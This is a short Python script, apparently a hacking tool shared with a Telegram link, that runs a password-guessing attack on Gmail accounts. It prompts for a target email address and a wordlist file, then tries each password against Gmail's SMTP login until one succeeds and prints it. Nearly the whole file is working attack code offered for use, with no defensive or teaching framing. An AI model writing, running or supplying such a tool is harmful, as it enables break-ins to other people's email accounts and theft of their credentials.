import colorama
from colorama import Fore, Back, Style
colorama.init()
print(Fore.BLUE+"===========================================================================")
print(Fore.RED+"          |--||     (----|                                                    ")
print(Fore.GREEN+"          |  ||     (  ____     |\\\   |\\\      (\    @@  ||                ")
print(Fore.RED+"          |\--      (     |     | \\\  | \\\     (-\   ||  ||             ")
print(Fore.GREEN+"          | \\\      (-----|     |  \\\ |  \\\    (  \  ||  ||                     ")
print(Fore.RED+"                                |   \\\|   \\\         ||  ||                      ")
print(Fore.GREEN+"===========================================================================")
print(Fore.WHITE+"         ver:1          linktelegram: https://t.me/+GCZQwteFy5Q3Yzc0")

import smtplib
import time
from os import system
print("")
email =input("Enter your target email address => ")
passwfile = input("\nEnter your target password address => ")
passwfile = open(passwfile, "r")

def crack():
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()

    for password in passwfile:
        try:
            smtpserver.login(email, password)
            print(Fore.GREEN+"[*] Correct password => %s" % password)
            break
        except smtplib.SMTPAuthenticationError:
            print(Fore.RED+"[!] Wrong password => %s" % password)

crack()
